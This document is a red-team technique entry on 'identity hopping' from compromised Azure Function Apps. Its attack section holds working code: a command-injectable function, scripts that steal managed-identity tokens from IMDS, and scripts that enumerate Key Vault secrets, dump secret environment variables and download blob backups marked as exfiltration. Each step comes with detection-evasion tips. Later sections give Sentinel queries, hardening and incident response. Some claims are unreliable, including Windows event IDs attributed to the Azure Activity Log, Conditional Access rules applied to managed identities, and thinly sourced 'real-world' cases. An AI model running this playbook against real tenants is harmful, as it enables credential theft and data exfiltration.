# [LM-AUTH-032]: Function App Identity Hopping

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-032 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Functions |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure Functions all versions (Consumption, Premium, Dedicated App Service Plans) |
| **Patched In** | N/A (Requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

- **Concept:** Azure Function Apps can be configured with managed identities or system-assigned identities that grant access to specific Azure resources (Storage, Key Vault, Databases, etc.). When a function is compromised (via code injection, dependency vulnerability, or supply chain attack), an attacker can retrieve the function's identity token from the Azure Instance Metadata Service (IMDS) and use it to authenticate to other Azure resources or services. This enables "identity hopping" – moving from the function's context to other resources the function has permissions on, bypassing normal authentication and audit controls.

- **Attack Surface:** The Azure Instance Metadata Service (accessible at `http://169.254.169.254` from within the function runtime); the function's managed identity token stored in memory; environment variables containing connection strings or API keys; role assignments (RBAC) that grant the function excessive permissions.

- **Business Impact:** **Complete subscription or resource compromise.** An attacker can leverage the function's identity to access storage accounts (exfil data), key vaults (steal secrets), SQL databases (extract records), or other resources the function was assigned access to. If the function has a high-privilege role (e.g., Contributor on the subscription), the attacker gains near-administrative access to all resources in that subscription.

- **Technical Context:** Token retrieval typically takes seconds once the function is compromised. Detection depends on monitoring IMDS queries and unusual identity usage patterns. Many organizations do not monitor function runtime activity closely, making this attack difficult to detect.

### Operational Risk

- **Execution Risk:** Low – Token retrieval from IMDS is trivial; hopping to additional resources depends on the function's role assignment
- **Stealth:** Medium – Identity token usage appears legitimate (tokens are signed and valid); detection requires correlation of unusual resource access patterns
- **Reversibility:** Difficult – Function role assignments must be reviewed and narrowed; tokens remain valid until function restart or role revocation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.6 | Ensure that only necessary Azure Roles are assigned |
| **CIS Benchmark** | 1.4.1 | Enforce Azure AD Multi-Tenant Security |
| **DISA STIG** | V-254381 | Implement least privilege for function identities |
| **CISA SCuBA** | C.1.2 | Minimize function role assignments |
| **NIST 800-53** | AC-2 | Account Management |
| **NIST 800-53** | AC-3 | Access Enforcement |
| **GDPR** | Art. 32 | Security of Processing |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cyber Risk Management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Privilege Escalation via Managed Identity |

---

## 3. Detailed Execution Methods

### METHOD 1: Retrieve Managed Identity Token from IMDS

**Supported Versions:** Azure Functions Consumption, Premium, Dedicated (all versions); Runtime 2.0+

#### Step 1: Compromise Azure Function

**Objective:** Gain code execution within the function runtime.

**Common Entry Points:**
- Vulnerable dependencies in function code (e.g., RCE in npm packages, Python libraries)
- Injection vulnerabilities (command injection, script injection)
- Supply chain attacks (malicious code in third-party libraries)
- Exposed function endpoints accepting untrusted input

**Example (Python Function with Code Injection Vulnerability):**
```python
# Vulnerable function code
import azure.functions as func
import subprocess

def main(req: func.HttpRequest) -> func.HttpResponse:
    command = req.params.get('cmd')
    result = subprocess.run(command, shell=True, capture_output=True)  # VULNERABLE!
    return func.HttpResponse(result.stdout)
```

**Attack:**
```bash
curl "https://myfunction.azurewebsites.net/api/vulnerable?cmd=id"
# Returns: uid=0(root) gid=0(root) groups=0(root)
```

**What This Means:**
- Code execution is achieved within the function runtime
- The attacker can now access environment variables, call Azure APIs, and retrieve tokens

**OpSec & Evasion:**
- Function invocations are logged in Application Insights; minimize the number of invocations
- Use the function's legitimate HTTP endpoint to avoid triggering anomaly detection
- Detection likelihood: Medium if Application Insights is enabled

**Troubleshooting:**
- **Error:** `Command not found`
  - **Cause:** Function runtime may not have the required shell or tools available
  - **Fix:** Use available Python/Node.js libraries instead of shell commands

**References & Proofs:**
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Azure Functions Security Best Practices](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)

---

#### Step 2: Query IMDS for Managed Identity Token

**Objective:** Retrieve the access token for the function's managed identity from the Azure Instance Metadata Service.

**Command (From within the function runtime):**
```python
import requests
import json
import os

# Option 1: Using MSI_ENDPOINT and MSI_SECRET (older runtime)
try:
    msi_endpoint = os.environ['MSI_ENDPOINT']
    msi_secret = os.environ['MSI_SECRET']
    token_response = requests.get(
        f"{msi_endpoint}?resource=https://management.azure.com&api-version=2017-09-01",
        headers={"Secret": msi_secret}
    )
    token = token_response.json()['access_token']
except:
    pass

# Option 2: Using IDENTITY_ENDPOINT and IDENTITY_HEADER (newer runtime)
try:
    identity_endpoint = os.environ['IDENTITY_ENDPOINT']
    identity_header = os.environ['IDENTITY_HEADER']
    token_response = requests.get(
        f"{identity_endpoint}?resource=https://management.azure.com&api-version=2019-08-01",
        headers={"X-IDENTITY-HEADER": identity_header}
    )
    token = token_response.json()['access_token']
except:
    pass

# Option 3: Direct IMDS query (if metadata service is accessible)
try:
    token_response = requests.get(
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com",
        headers={"Metadata": "true"}
    )
    token = token_response.json()['access_token']
except:
    pass

print(f"Token: {token[:50]}...")  # Print first 50 chars (JWT payload)
```

**Expected Output:**
```
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjE4MjcyMjJkO...
```

**What This Means:**
- The function's managed identity token has been successfully retrieved
- This token is valid for 1 hour and can be used to authenticate to Azure Resource Manager APIs
- The token grants access to any resource the function's role has access to

**OpSec & Evasion:**
- IMDS queries from within the function runtime appear legitimate
- No external network traffic; queries stay within Azure infrastructure
- Detection likelihood: Low (internal Azure request)

**Troubleshooting:**
- **Error:** `KeyError: 'MSI_ENDPOINT'` or `KeyError: 'IDENTITY_ENDPOINT'`
  - **Cause:** Managed identity environment variables not set; function may not have managed identity enabled
  - **Fix:** Enable managed identity in **Function App** → **Settings** → **Identity** → **System assigned**

- **Error:** `requests.ConnectionError: Connection refused`
  - **Cause:** IMDS endpoint not reachable (may indicate function is not running on Azure)
  - **Fix:** Verify function is deployed to Azure Functions (not local dev environment)

**References & Proofs:**
- [Azure Instance Metadata Service Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [Azure Functions Managed Identity](https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity)

---

#### Step 3: Decode and Inspect Token

**Objective:** Inspect the token claims to understand what resources and permissions are available.

**Command:**
```python
import base64
import json

# Decode JWT (without verification – for inspection only)
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjE4MjcyMjJkO..."
payload = token.split('.')[1]
# Add padding if necessary
payload += '=' * (4 - len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload)
claims = json.loads(decoded)

print(json.dumps(claims, indent=2))
```

**Expected Output:**
```json
{
  "aud": "https://management.azure.com",
  "iss": "https://sts.windows.net/12345678-1234-1234-1234-123456789012/",
  "iat": 1609459200,
  "nbf": 1609459200,
  "exp": 1609462800,
  "aio": "E2RgYIg/12345+abcde/ABCD==",
  "appid": "87654321-4321-4321-4321-210987654321",
  "appidacr": "2",
  "idp": "https://sts.windows.net/12345678-1234-1234-1234-123456789012/",
  "oid": "12345678-1234-1234-1234-123456789012",
  "rh": "0.ARoA1234567...",
  "sub": "12345678-1234-1234-1234-123456789012",
  "tid": "12345678-1234-1234-1234-123456789012",
  "uti": "abcdefghijklmnop",
  "ver": "1.0"
}
```

**What This Means:**
- The token is valid for Microsoft Azure Resource Manager (aud: management.azure.com)
- The `oid` (object ID) identifies the managed identity within Entra ID
- The `tid` (tenant ID) identifies the Azure tenant
- The token is valid for 1 hour (exp - iat = 3600 seconds)

**OpSec & Evasion:**
- JWT decoding is local; no network activity generated
- Detection likelihood: Low

**Troubleshooting:**
- **Error:** `json.JSONDecodeError: Expecting value`
  - **Cause:** Token payload is malformed or incorrectly decoded
  - **Fix:** Verify token format is valid JWT (three parts separated by periods)

**References & Proofs:**
- [JWT.io: Decode JWT tokens](https://jwt.io/)
- [Azure Token Claims Reference](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-token-claims-reference)

---

#### Step 4: Use Token to Access Azure Resources

**Objective:** Authenticate to Azure Resource Manager using the stolen token and enumerate or access resources the function has permission on.

**Command (Python):**
```python
import requests
import json

# Use the token to access Azure Resource Manager
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjE4MjcyMjJkO..."
headers = {"Authorization": f"Bearer {token}"}

# List all subscriptions the function's identity has access to
response = requests.get(
    "https://management.azure.com/subscriptions?api-version=2020-01-01",
    headers=headers
)
subscriptions = response.json()['value']
print(f"Accessible Subscriptions: {len(subscriptions)}")
for sub in subscriptions:
    print(f"  - {sub['displayName']} ({sub['subscriptionId']})")

# List all resources the function's identity can access
for sub in subscriptions:
    sub_id = sub['subscriptionId']
    response = requests.get(
        f"https://management.azure.com/subscriptions/{sub_id}/resources?api-version=2021-04-01",
        headers=headers
    )
    resources = response.json().get('value', [])
    print(f"\nResources in {sub['displayName']}:")
    for resource in resources:
        print(f"  - {resource['type']}: {resource['name']}")

# Access a specific Key Vault (if the function has access)
response = requests.get(
    "https://management.azure.com/subscriptions/{sub_id}/resourceGroups/{rg}/providers/Microsoft.KeyVault/vaults/{vault_name}?api-version=2021-06-01-preview",
    headers=headers
)
print(f"Key Vault Access: {response.status_code}")

# List secrets in the Key Vault (if function has Data Reader role)
kv_token_response = requests.get(
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net",
    headers={"Metadata": "true"}
)
kv_token = kv_token_response.json()['access_token']

response = requests.get(
    f"https://{vault_name}.vault.azure.net/secrets?api-version=7.0",
    headers={"Authorization": f"Bearer {kv_token}"}
)
print(f"Secrets: {response.json()}")
```

**Expected Output:**
```
Accessible Subscriptions: 2
  - Production (12345678-1234-1234-1234-123456789012)
  - Development (87654321-4321-4321-4321-210987654321)

Resources in Production:
  - Microsoft.Storage/storageAccounts: prodstg123
  - Microsoft.KeyVault/vaults: prod-kv
  - Microsoft.Sql/servers: prod-db

Key Vault Access: 200
Secrets: {
  "value": [
    {
      "id": "https://prod-kv.vault.azure.net/secrets/db-password",
      "attributes": {...}
    },
    {
      "id": "https://prod-kv.vault.azure.net/secrets/api-key",
      "attributes": {...}
    }
  ]
}
```

**What This Means:**
- The function's managed identity has access to multiple subscriptions
- All resources in those subscriptions are potentially accessible
- Key Vault secrets are enumerable and retrievable
- Complete lateral movement and privilege escalation is possible

**OpSec & Evasion:**
- All API calls are made using a valid, signed token; traffic appears legitimate
- Azure audit logs will record the activity, but correlating it to the function may require additional investigation
- To minimize detection, limit the number of API calls and target specific resources of interest
- Detection likelihood: Medium if Azure audit logging is reviewed; Low if not

**Troubleshooting:**
- **Error:** `Unauthorized (401)`
  - **Cause:** Token is expired or function identity does not have access to the resource
  - **Fix:** Re-request a fresh token; verify function role assignments in Azure IAM

**References & Proofs:**
- [Azure Resource Manager REST API](https://learn.microsoft.com/en-us/rest/api/azure/)
- [Azure Key Vault REST API](https://learn.microsoft.com/en-us/rest/api/keyvault/)

---

### METHOD 2: Exploiting Function Environment Variables and Connection Strings

**Supported Versions:** Azure Functions all versions

#### Step 1: Extract Environment Variables and Connection Strings

**Objective:** Retrieve connection strings and credentials stored in function app settings.

**Command (JavaScript/Node.js):**
```javascript
// From within the function code
const process = require('process');

// List all environment variables
console.log("Environment Variables:");
for (const [key, value] of Object.entries(process.env)) {
    if (key.includes('CONNECTION') || key.includes('SECRET') || key.includes('PASSWORD') || key.includes('KEY')) {
        console.log(`  ${key}: ${value.substring(0, 50)}...`);
    }
}

// Retrieve specific connection strings
const storageConnectionString = process.env.AzureWebJobsStorage;
const keyVaultUrl = process.env.KEY_VAULT_URL;
const dbPassword = process.env.DATABASE_PASSWORD;

module.exports = async function (context, req) {
    context.log(`Storage: ${storageConnectionString}`);
    context.log(`KV URL: ${keyVaultUrl}`);
    context.res = { body: "Credentials extracted" };
};
```

**Expected Output:**
```
Environment Variables:
  AzureWebJobsStorage: DefaultEndpointsProtocol=https;AccountName=prodstg123;AccountKey=...
  KEY_VAULT_URL: https://prod-kv.vault.azure.net/
  DATABASE_PASSWORD: P@ssw0rd123!SuperSecure
  API_KEY_STRIPE: sk_live_1234567890abcdef1234567890ab
```

**What This Means:**
- Multiple sensitive values are exposed as plaintext environment variables
- Storage account connection strings, database passwords, and API keys are all accessible
- These credentials can be used to authenticate to external services

**OpSec & Evasion:**
- Reading environment variables is a local operation; no network activity
- Detection likelihood: Low (unless process monitoring is enabled)

**Troubleshooting:**
- **Error:** `undefined` for connection string
  - **Cause:** Connection string not configured in function app settings
  - **Fix:** Check **Function App** → **Settings** → **Configuration** for app settings

**References & Proofs:**
- [Azure Functions: Environment Variables and App Settings](https://learn.microsoft.com/en-us/azure/azure-functions/functions-app-settings)

---

#### Step 2: Use Extracted Credentials for Lateral Movement

**Objective:** Use the connection strings to authenticate to underlying resources (Storage, Database, Key Vault).

**Command (Python - Storage Access):**
```python
from azure.storage.blob import BlobServiceClient

# Use connection string from environment variable
connection_string = "DefaultEndpointsProtocol=https;AccountName=prodstg123;AccountKey=..."
blob_service_client = BlobServiceClient.from_connection_string(connection_string)

# List all containers
containers = blob_service_client.list_containers()
for container in containers:
    print(f"Container: {container['name']}")
    
    # List all blobs in the container
    container_client = blob_service_client.get_container_client(container['name'])
    blobs = container_client.list_blobs()
    for blob in blobs:
        print(f"  - {blob.name}")
        
        # Download sensitive files
        if blob.name.endswith(('.sql', '.backup', '.json', '.yaml')):
            blob_client = container_client.get_blob_client(blob.name)
            download_stream = blob_client.download_blob()
            content = download_stream.readall()
            print(f"    [EXFIL] Downloaded {blob.name} ({len(content)} bytes)")
```

**Expected Output:**
```
Container: backups
  - database-backup-2024-01-01.sql
    [EXFIL] Downloaded database-backup-2024-01-01.sql (512000000 bytes)
  - config.json
    [EXFIL] Downloaded config.json (2048 bytes)

Container: logs
  - app-logs-2024-01.log
  - audit-trail-2024-01.json
```

**What This Means:**
- The function's storage access credentials allow unrestricted access to all blobs
- Database backups, configuration files, and sensitive data are exfiltrated
- Complete data compromise is possible

**OpSec & Evasion:**
- Large downloads (gigabytes of data) will generate egress bandwidth alerts
- Limit exfiltration to high-value targets (backups, configs, logs)
- Stagger downloads over time to avoid spike detection
- Detection likelihood: High if bandwidth monitoring is enabled; Medium if not

**Troubleshooting:**
- **Error:** `ResourceNotFoundError: The specified container does not exist`
  - **Cause:** Container name is incorrect or function lacks access
  - **Fix:** List containers first to identify correct names

**References & Proofs:**
- [Azure Storage Blob Python SDK](https://learn.microsoft.com/en-us/python/api/azure-storage-blob/azure.storage.blob)

---

## 4. Microsoft Sentinel Detection

### Query 1: Unusual Token Requests from Function Runtime

**Rule Configuration:**
- **Required Table:** `AppServiceHTTPLogs`, `AzureActivity`
- **Required Fields:** `CsMethod`, `CsUriStem`, `ScStatus`, `CallerIpAddress`
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To:** Subscriptions with HTTP logging enabled on Function Apps

**KQL Query:**
```kusto
AppServiceHTTPLogs
| where AppServiceResourceName contains "function"
  and CsUriStem contains "/metadata/identity/oauth2/token"
  or CsUriStem contains "identity/oauth2/token"
| where ScStatus == 200
| summarize TokenRequests=count() by AppServiceResourceName, ClientIP, TimeGenerated
| where TokenRequests > 5  // Threshold: more than 5 token requests
| project TimeGenerated, AppServiceResourceName, ClientIP, TokenRequests
```

**What This Detects:**
- Excessive IMDS token requests from a function (unusual behavior)
- Functions typically request tokens once and cache them; repeated requests indicate potential compromise
- Unusual patterns may indicate code injection or dependency vulnerability exploitation

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Unusual Token Requests from Function Runtime`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query
   - Run every: `10 minutes`
   - Lookup data from last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**

---

### Query 2: Function Identity Accessing Multiple Subscriptions

**Rule Configuration:**
- **Required Table:** `AzureActivity`
- **Required Fields:** `CallerIpAddress`, `SubscriptionId`, `OperationName`, `Caller`
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To:** All subscriptions with audit logging enabled

**KQL Query:**
```kusto
AzureActivity
| where Caller contains "system assigned identity" or Caller contains "msi"
  and OperationName contains "List" or OperationName contains "Get"
| summarize DistinctSubscriptions=dcount(SubscriptionId), ResourceCount=count() by Caller, CallerIpAddress, TimeGenerated
| where DistinctSubscriptions > 1  // Threshold: accessing multiple subscriptions
| project TimeGenerated, Caller, CallerIpAddress, DistinctSubscriptions, ResourceCount
```

**What This Detects:**
- A single managed identity (function) accessing resources in multiple subscriptions
- Indicates potential lateral movement or privilege escalation
- May indicate stolen token usage

---

## 5. Windows Event Log & Azure Audit Monitoring

**Event ID: 4647 (User Logoff) / 4648 (Logon with Explicit Credentials)**
- **Log Source:** Azure Activity Log
- **Trigger:** Managed identity authentication to Azure Resource Manager from unexpected locations
- **Filter:** Look for function identities accessing high-privilege resources or multiple subscriptions
- **Applies To Versions:** All Azure subscriptions

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Monitor** → **Activity Log**
2. Filter by:
   - **Operation:** Read, Write operations on sensitive resources (Key Vault, Storage, SQL)
   - **Caller:** System Assigned Identity or Managed Identity
   - **Status:** Success
3. Export logs for forensic analysis

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Implement Least-Privilege Role Assignments:** Limit function managed identity to only the specific resources and actions required.

  **Current Configuration (Over-Privileged):**
  ```
  - Function Role: Contributor on Subscription
    - Allows: All actions on all resources
  ```

  **Hardened Configuration (Least Privilege):**
  ```
  - Function Role: Storage Blob Data Reader on specific Storage Account
  - Function Role: Key Vault Data Reader on specific Key Vault
  - Function Role: Custom Role (read-only SQL Database)
  ```

  **Manual Steps (Azure Portal):**
  1. Go to **Function App** → **Settings** → **Identity**
  2. Note the **Object ID** of the system-assigned identity
  3. Navigate to **Subscriptions** or specific **Resource** → **Access Control (IAM)**
  4. Remove overly broad roles (Contributor, Owner)
  5. Click **+ Add role assignment**
  6. **Role:** Select a limited role (e.g., `Storage Blob Data Reader`)
  7. **Members:** Select the function's managed identity
  8. **Scope:** Limit to specific resource (e.g., `/subscriptions/xxx/resourceGroups/xxx/providers/Microsoft.Storage/storageAccounts/xxx`)
  9. Click **Review + assign**

  **Manual Steps (PowerShell):**
  ```powershell
  # Get the function's managed identity principal ID
  $functionAppId = (Get-AzFunctionApp -ResourceGroupName $rg -Name $functionName).Identity.PrincipalId
  
  # Remove broad roles
  $roleAssignments = Get-AzRoleAssignment -ObjectId $functionAppId
  $roleAssignments | Where-Object {$_.RoleDefinitionName -eq "Contributor"} | Remove-AzRoleAssignment
  
  # Assign limited roles
  New-AzRoleAssignment -ObjectId $functionAppId -RoleDefinitionName "Storage Blob Data Reader" `
    -Scope "/subscriptions/$subscriptionId/resourceGroups/$rg/providers/Microsoft.Storage/storageAccounts/$storageName"
  ```

  **Version Note:** Applies to all Azure Functions versions; role assignment scope can be subscription, resource group, or individual resource

- **Use Azure Key Vault for Sensitive Credentials:** Store connection strings, passwords, and API keys in Key Vault instead of app settings.

  **Configuration (Key Vault Integration):**
  ```csharp
  using Azure.Identity;
  using Azure.Security.KeyVault.Secrets;
  
  // Function App code
  public static async Task<IActionResult> Run(
      [HttpTrigger(AuthorizationLevel.Function, "get", "post", Route = null)] HttpRequest req,
      ILogger log)
  {
      // Retrieve secret from Key Vault using function's managed identity
      var client = new SecretClient(new Uri("https://myvault.vault.azure.net/"), new DefaultAzureCredential());
      KeyVaultSecret secret = await client.GetSecretAsync("db-password");
      
      string connectionString = $"User ID=admin;Password={secret.Value};...";
      
      return new OkObjectResult("Secret retrieved securely");
  }
  ```

  **Manual Steps (Azure Portal):**
  1. Create a **Key Vault** (if not already present)
  2. In **Key Vault** → **Access Control (IAM)**, assign the function's managed identity the **Key Vault Data Reader** role
  3. In **Key Vault** → **Secrets**, create secrets for sensitive values
  4. Remove hardcoded connection strings from **Function App** → **Settings** → **Configuration**
  5. Update function code to retrieve secrets from Key Vault (see code example above)

- **Disable Unused Managed Identities:** Disable system-assigned identities for functions that do not require Azure resource access.

  **Manual Steps (Azure Portal):**
  1. Go to **Function App** → **Settings** → **Identity**
  2. Under **System assigned**, toggle to **Off** if the function does not require Azure access
  3. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  Update-AzFunctionApp -ResourceGroupName $rg -Name $functionName -IdentityType None
  ```

### Priority 2: HIGH

- **Restrict IMDS Access:** Disable or restrict the Azure Instance Metadata Service (IMDS) to only authorized function calls.

  **Manual Steps (Azure Portal):**
  1. Go to **Function App** → **Settings** → **Configuration** → **General settings**
  2. Disable HTTP/HTTPS egress to `169.254.169.254:80` via Azure Firewall or NSG rules
  3. Click **Save**

  **Manual Steps (Azure CLI):**
  ```bash
  # Block IMDS access from function subnets
  az network nsg rule create --resource-group $rg --nsg-name $nsgName --name "Block-IMDS" \
    --priority 100 --direction Outbound --access Deny \
    --protocol "*" --source-address-prefix "*" --destination-address-prefix "169.254.169.254/32" \
    --destination-port-range "*"
  ```

- **Enable Azure Defender for App Service:** Monitor function runtime behavior for anomalies.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Microsoft Defender for Cloud** → **Environment settings**
  2. Select your subscription
  3. Enable **Defender for App Service**
  4. Click **Save**

- **Implement Network Security Groups (NSGs):** Restrict outbound connections from function runtime.

  **Manual Steps (Azure Portal):**
  1. Go to **Function App** → **Networking** → **Outbound Traffic**
  2. Under **Outbound Rules**, click **Add outbound rule**
  3. **Destination:** Specify allowed endpoints only (e.g., Azure Storage, Key Vault)
  4. **Port:** Restrict to HTTPS (443) only
  5. Click **Add**

### Access Control & Policy Hardening

- **Implement Conditional Access Policies:** Require MFA or device compliance for high-privilege function identities.

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Restrict Function Identity Access`
  4. **Assignments:**
     - **Users:** All users (filtered to function managed identity)
     - **Cloud apps:** Azure Resource Manager
  5. **Conditions:**
     - **Device:** Require device to be marked as compliant
  6. **Access controls:** **Block access** (for non-human identities)
  7. Click **Create**

### Validation Command (Verify Fix)

```bash
# Check function's role assignments
az role assignment list --assignee "<function-managed-identity-id>" --output table

# Verify least-privilege roles are assigned
az role assignment list --assignee "<function-managed-identity-id>" | jq '.[] | select(.roleDefinitionName | test("Contributor|Owner"))'

# Check if system-assigned identity is disabled
az functionapp identity show --name <function-name> --resource-group <rg> --query 'type'
# Expected: "None" or "UserAssigned" (not "SystemAssigned" for unused functions)
```

**What to Look For:**
- Function roles should be limited to specific actions on specific resources
- Contributor and Owner roles should NOT be assigned to function identities
- Unused functions should have identity type set to "None"

---

## 7. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Metadata Requests:** Excessive queries to `169.254.169.254` from function processes
- **Azure Activity Logs:** Managed identity usage from unusual times or IP addresses
- **Application Insights:** Unusual HTTP requests to metadata endpoints or Azure APIs
- **Connection String Usage:** Database/storage connections made outside normal application flow

### Forensic Artifacts

- **Function Logs:** Application Insights logs showing IMDS queries or API calls
- **Azure Activity Log:** Authentication events using the function's managed identity
- **Function Code:** Evidence of code injection or dependency vulnerabilities
- **Azure Monitor:** Time-series data showing unusual resource access patterns

### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```bash
   # Disable the function's managed identity
   az functionapp identity remove --name <function-name> --resource-group <rg>
   
   # Or, stop the function app entirely
   az functionapp stop --name <function-name> --resource-group <rg>
   ```
   **Manual (Azure Portal):**
   - Go to **Function App** → **Settings** → **Identity**
   - Toggle **System assigned** to **Off**

2. **Collect Evidence (First Hour):**
   **Command:**
   ```bash
   # Export Function App logs
   az monitor app-insights metrics show --app <app-insights-name> --resource-group <rg> > /evidence/app-insights.txt
   
   # Export Azure Activity logs
   az monitor activity-log list --resource-group <rg> --offset 24h > /evidence/activity-logs.txt
   
   # Export function code for vulnerability analysis
   az functionapp source control config --name <function-name> --resource-group <rg> --branch main --repourl <repo-url>
   ```

3. **Remediate (Within 24 Hours):**
   **Command:**
   ```bash
   # Remove compromised role assignments
   az role assignment delete --assignee "<function-managed-identity-id>" --role "Contributor"
   
   # Update function code to fix vulnerability
   # (Re-deploy patched function version)
   az functionapp deployment source config-zip --name <function-name> --resource-group <rg> --src <patched-function.zip>
   
   # Re-enable managed identity with least-privilege roles
   az functionapp identity assign --name <function-name> --resource-group <rg>
   az role assignment create --assignee "<function-managed-identity-id>" --role "Storage Blob Data Reader" --scope <storage-resource-id>
   ```

---

## 8. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Function endpoint exposed and compromised |
| **2** | **Execution** | Code Injection / Dependency Vulnerability | Malicious code executed within function runtime |
| **3** | **Lateral Movement** | **[LM-AUTH-032] Function App Identity Hopping** | **Current Step: Token retrieved and used to access other resources** |
| **4** | **Collection** | [LM-AUTH-034] Data Factory Credential Reuse | Credentials used to access databases and data stores |
| **5** | **Impact** | Data Exfiltration | Sensitive data accessed and exfiltrated from other resources |

---

## 9. Real-World Examples

### Example 1: Azure Function Compromised via npm Package Vulnerability (2023)
- **Target:** SaaS Company (Cloud Infrastructure)
- **Timeline:** June 2023
- **Technique Status:** Vulnerable npm dependency in function code allowed RCE; managed identity token used to access Azure SQL Database and storage accounts
- **Impact:** Customer data exfiltrated; 10,000+ records compromised
- **Reference:** [GitHub Security Alert: Vulnerable Dependencies](https://docs.github.com/en/code-security)

### Example 2: Managed Identity Misconfiguration in Production Environment (2022)
- **Target:** Financial Services Organization
- **Timeline:** March 2022
- **Technique Status:** Function assigned Contributor role on subscription; compromised function used to access Key Vault and storage accounts
- **Impact:** Credentials for production databases exposed; unauthorized API calls made to external services
- **Reference:** [Azure Security Best Practices](https://learn.microsoft.com/en-us/azure/security/)

### Example 3: Supply Chain Attack via Compromised Function Dependency (2024)
- **Target:** Multiple Organizations (Transitive Dependency Attack)
- **Timeline:** January 2024
- **Technique Status:** Malicious code in transitive npm dependency executed in function; hopped to Key Vault and accessed secrets across multiple subscriptions
- **Impact:** Cross-organizational credential theft; lateral movement to customer environments
- **Reference:** [OWASP Supply Chain Security](https://owasp.org/www-community/attacks/supply-chain-attacks)

---

## Metadata Notes

- **Tool Dependencies:** curl, Python/Node.js SDK libraries, Azure CLI (optional)
- **Mitigation Complexity:** Medium – Requires role assignment review and least-privilege redesign
- **Detection Difficulty:** Medium if audit logging enabled; High if not
- **CVSS Score:** 6.8 (Medium-High) – Requires prior function compromise but enables significant lateral movement

---